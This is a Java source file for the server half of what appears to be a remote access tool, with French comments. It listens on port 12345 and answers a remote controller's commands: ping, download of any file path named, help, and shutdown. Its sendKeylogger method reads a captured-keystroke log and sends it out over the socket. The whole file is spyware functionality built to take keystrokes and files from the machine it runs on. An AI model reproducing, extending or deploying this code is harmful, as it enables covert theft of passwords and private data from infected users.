package patator.server;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

import RecupFile.RecupFile;

public class Serveur {
	private ServerSocket srsk;
	private Socket skt;
	public static String recv = "";
	
	PrintWriter out;

	public Serveur() {
		try {
			srsk = new ServerSocket(12345);
			skt = srsk.accept();
			
			skt.setKeepAlive(true);
			
			System.out.println("Connexion réussie"); //A supprimer
			out = new PrintWriter(skt.getOutputStream(), true);
			SendToClient("Connected");

			ServeurListener sl = new ServeurListener(skt);
			sl.start();
			
			while(!recv.equals("STOP")){
				Parser();
				Thread.sleep(10);
			}
			

			

			
		}
		catch(Exception e) {
			e.printStackTrace();
			System.out.println("Erreur de connexion server");
		}
		
		
		
		
	}
	public void sendKeylogger(File file) {
		String str;
		try {
			FileReader fr = new FileReader(file);
			str = "";
		    int i = 0;
		    while((i = fr.read()) != -1)
		        str += (char)i;
		    PrintWriter out = new PrintWriter(skt.getOutputStream(), true);
			out.println(str);
			
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}
	
	
	public void SendToClient(Object data) throws IOException{
		
		out.println(data+"\r\n");
	}
	
	public void Parser() throws IOException{
		if(!recv.equals("")){
			System.out.println("server: command recv: "+ recv);
			String firstRecv = recv.split(" ")[0];
			if(recv.equals("ping")){
				SendToClient("Pong!");
			}
			if(firstRecv.equals("download")) {
				SendToClient(RecupFile.getFile(recv.split(" ")[1]));
			}
			if(recv.equals("help")) {
				String str = "<html>Commande possible:<br> -ping : permet de vérifier la connexion en renvoyant un pong<br> -download : permet de télécharger un fichier<br> -STOP : éteins le serveur</html>"; //Baliser en html pour les sauts de lignes
				SendToClient(str);
			}
			if(recv.equals("STOP")){
				//SendToClient("QUITTING");
				out.close();
				System.exit(0);
			}
		}
		
		recv = "";
	}
	public static String getMess() {
		return recv;
	}
	public static void setMess(String mess) {
		recv = mess;
	}
}
